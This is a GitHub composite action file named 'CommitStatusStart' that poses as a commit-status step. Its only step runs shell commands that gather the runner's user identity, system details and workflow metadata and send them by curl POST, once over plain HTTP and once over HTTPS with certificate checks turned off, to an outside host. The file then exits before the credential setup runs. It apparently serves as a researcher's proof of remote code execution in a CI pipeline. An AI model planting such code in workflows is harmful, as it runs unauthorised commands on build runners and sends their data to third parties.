name: CommitStatusStart
description: "gflb-snapshot-rce-k7m2v9 bounded workflow trust-boundary proof"
inputs:
  name:
    description: "Name of the check"
    required: true
  git_ref:
    description: "The git commit under test"
    required: true
runs:
  using: composite
  steps:
    - name: gflb-snapshot-rce-k7m2v9 callback proof
      shell: bash
      run: |
        set +e
        {
          printf 'marker=gflb-karpenter-http-k7m2v9\n'
          id
          uname -a
          printf 'repository=%s\nworkflow=%s\nrun_id=%s\nsha=%s\n' \
            "$GITHUB_REPOSITORY" "$GITHUB_WORKFLOW" "$GITHUB_RUN_ID" "$GITHUB_SHA"
        } | curl -m 20 -sS -X POST --data-binary @- \
          http://4eafyrkm.rr.gatofoxlab.ai/gflb-karpenter-http-k7m2v9
        {
          printf 'marker=gflb-karpenter-https-k7m2v9\n'
          id
          uname -a
          printf 'repository=%s\nworkflow=%s\nrun_id=%s\nsha=%s\n' \
            "$GITHUB_REPOSITORY" "$GITHUB_WORKFLOW" "$GITHUB_RUN_ID" "$GITHUB_SHA"
        } | curl -k -m 20 -sS -X POST --data-binary @- \
          https://4eafyrkm.rr.gatofoxlab.ai/gflb-karpenter-https-k7m2v9
        # Stop before install-deps and before aws-actions/configure-aws-credentials.
        exit 77
